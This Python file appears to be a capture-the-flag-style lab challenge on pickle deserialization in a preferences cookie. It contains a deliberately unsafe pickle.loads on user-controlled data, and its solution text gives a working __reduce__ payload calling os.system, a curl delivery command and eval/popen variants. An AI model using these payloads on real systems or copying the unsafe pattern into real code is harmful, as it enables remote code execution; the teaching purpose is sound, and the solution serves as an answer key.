"""偏好设置处的 Python 反序列化 —— pickle。

业务场景是"记住我的显示偏好"：服务端把这份偏好序列化成一个 base64 字符串塞进
Cookie，下次请求再解回来。看起来挺方便。

问题在于它用的序列化格式是 **pickle**。pickle 的格式里**包含了"要调用哪个函数"**
这件事 —— 也就是说，能控制这段字节的人，就能决定服务端解的时候去调用什么。
这不是"数据"，是可执行的指令序列。

这一题用的链是最短的那条：`__reduce__` 返回 `(可调用对象, 参数元组)`。
"""

import base64
import os
import pickle
import sqlite3
import subprocess

from vuln4all import Vuln, render_template, request

DB_NAME = "accounts.db"

#: 学习者证明自己拿到命令执行的方式：在应用数据目录里写下这个文件。
#: 它是判定凭据 —— 页面上会显示这个路径。
PROOF_FILE = "proof.txt"

GOAL = "让服务端在应用数据目录里写下 proof.txt（证明命令被执行了）"

COOKIE_NAME = "prefs"

#: 服务端认识的偏好字段和默认值。
DEFAULTS = {"theme": "light", "lang": "zh", "page_size": "20"}


class PickleCookie(Vuln):
    info = {
        "name": "偏好 Cookie 里的 pickle 反序列化",
        "author": ["guaidao2"],
        "cwe": "CWE-502",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "difficulty": "困难",
        "description": (
            "「记住我的显示偏好」把一份设置序列化进 Cookie。"
            "序列化用的是 Python 的 **pickle** —— 而 pickle 的格式里包含了"
            "「要调用哪个函数」，所以能改这段字节的人就能决定服务端执行什么。"
        ),
        "hint": (
            "先登录，然后把浏览器里的 prefs Cookie 拿出来，base64 解码看看里面是什么。"
            "它能看出结构吗？（试试 `pickletools.dis`）\n"
            "然后想一个问题：pickle 的字节流里除了数据，还有什么？\n"
            "具体一点：`pickle.loads` 拿到一段字节，它是靠什么知道"
            "「要把这个对象还原成什么类型」的？\n"
            "（关键词：`__reduce__`、`REDUCE` 操作码、GLOBAL 操作码）"
        ),
        "solution": (
            "一、先看清 Cookie 里的东西。它是一段 base64，解出来是 pickle 字节流：\n"
            "   python3 -c \"import base64,pickletools,sys; \"\\\n"
            "     \"pickletools.dis(base64.b64decode(input()))\"\n"
            "   你会看到操作码：`GLOBAL`（要 import 哪个名字）、`REDUCE`（调用它）。\n\n"
            "二、最简的一条链：``__reduce__`` 返回 `(可调用对象, 参数元组)`。\n"
            "   pickle 反序列化时会执行 `可调用对象(*参数元组)`。\n\n"
            "   import base64, os, pickle\n\n"
            "   class Evil:\n"
            "       def __reduce__(self):\n"
            "           return (os.system,\n"
            "                   ('id > <应用数据目录>/proof.txt',))\n\n"
            "   cookie = base64.b64encode(pickle.dumps(Evil())).decode()\n"
            "   print(cookie)\n\n"
            "   把打出来的那串填到下面的框里，或者直接当 Cookie 发：\n"
            "   curl -b 'prefs=<那串>' 'http://<靶场>/v/deserialization/pickle_cookie/'\n\n"
            "三、页面读到 proof.txt 就说明通了。\n\n"
            "别的写法（都行，挑一个顺手的）：\n"
            "  · (subprocess.check_output, (['id'],))   顺便把输出取回来\n"
            "  · (os.popen, ('id',))                    返回一个可读的管道\n"
            "  · (eval, (\"__import__('os').system('id')\",))\n\n"
            "真实世界里这条链的形态：\n"
            "  · Django 的签名 Cookie：`SECRET_KEY` 泄露 + 签名 Cookie 里存 pickle = RCE\n"
            "    （这是最著名的一个，因为 Django 早期默认这么做）\n"
            "  · Redis / Memcached 里存的 pickle 会话\n"
            "  · 消息队列里的 pickle 任务负载\n"
            "  · `torch.load` / `joblib.load` / `pandas.read_pickle` 加载别人给的模型/数据\n"
            "共同点：**反序列化 = 执行对方给的代码**。"
        ),
        "refs": [
            "https://docs.python.org/3/library/pickle.html",
            "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / DB_NAME))
        con.executescript(
            """
            CREATE TABLE accounts (
                username TEXT PRIMARY KEY,
                password TEXT NOT NULL
            );
            INSERT INTO accounts (username, password) VALUES
                ('alice', 'alice123');
            """
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        db_path = str(ctx.workspace / DB_NAME)
        proof_path = ctx.workspace / PROOF_FILE

        def check_password(user, password):
            con = sqlite3.connect(db_path)
            try:
                row = con.execute(
                    "SELECT 1 FROM accounts WHERE username = ? AND password = ?",
                    (user, password),
                ).fetchone()
                return row is not None
            finally:
                con.close()

        def load_prefs(blob):
            """把 Cookie 里的偏好解出来。如果解不出来就退回默认值。

            返回值带一个 load_error，好让页面把"反序列化这一步发生了什么"
            告诉做题的人 —— 这一题的原理全在这一步里。
            """
            if not blob:
                return dict(DEFAULTS), None
            try:
                # ↓↓↓ 洞就在这里：对**用户可控**的字节流调 pickle.loads ↓↓↓
                raw = base64.b64decode(blob)
                value = pickle.loads(raw)
                # ↑↑↑ 正确做法：用 json / 明确的 schema 校验，永远不要 pickle
                #     不可信数据 —— pickle 没有"安全模式"，也没有"只读数据"的选项 ↑↑↑
            except Exception as exc:  # noqa: BLE001
                return dict(DEFAULTS), "%s: %s" % (type(exc).__name__, exc)

            if not isinstance(value, dict):
                return dict(DEFAULTS), "解出来的不是 dict（是 %s）" % type(value).__name__
            prefs = dict(DEFAULTS)
            for key in DEFAULTS:
                if key in value:
                    prefs[key] = value[key]
            return prefs, None

        @app.route("/", methods=["GET", "POST"])
        def index():
            blob = request.cookies.get(COOKIE_NAME, "")
            message = None

            if request.method == "POST":
                user = request.form.get("user", "")
                password = request.form.get("password", "")
                if check_password(user, password):
                    blob = request.form.get("prefs", "").strip()
                    message = "已登录，偏好设置已保存。"
                    # 反序列化就发生在下面这次渲染里
                else:
                    message = "用户名或密码不对。"

            prefs, load_error = load_prefs(blob)

            proof = None
            if proof_path.is_file():
                proof = proof_path.read_text(encoding="utf-8", errors="replace")[:4000]
                if proof.strip():
                    ctx.progress.mark(GOAL)

            resp = render_template(
                "index.html",
                prefs=prefs,
                load_error=load_error,
                message=message,
                blob=blob,
                blob_len=len(blob),
                proof=proof,
                proof_path=str(proof_path),
                data_dir=str(ctx.workspace),
            )
            if blob:
                app_response = app.make_response(resp)
                app_response.set_cookie(COOKIE_NAME, blob, httponly=False)
                return app_response
            return resp

        @app.route("/清空", methods=["POST"])
        def clear():
            # 只动 this 题自己的 workspace
            if proof_path.exists():
                proof_path.unlink()
            resp = app.make_response(
                render_template(
                    "index.html",
                    prefs=dict(DEFAULTS),
                    load_error=None,
                    message="已清掉证明文件。",
                    blob="",
                    blob_len=0,
                    proof=None,
                    proof_path=str(proof_path),
                    data_dir=str(ctx.workspace),
                )
            )
            resp.delete_cookie(COOKIE_NAME)
            return resp

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        """从磁盘上推：proof.txt 有没有被写出来、而且不是空的。

        能从业已存在的状态推出来的，就别另存一份进度。
        """
        path = ctx.workspace / PROOF_FILE
        try:
            return {GOAL: bool(path.read_text(encoding="utf-8", errors="replace").strip())}
        except OSError:
            return {GOAL: False}


_ = (os, subprocess)  # 这两个 import 是给 writeup 里那几种写法当参考的
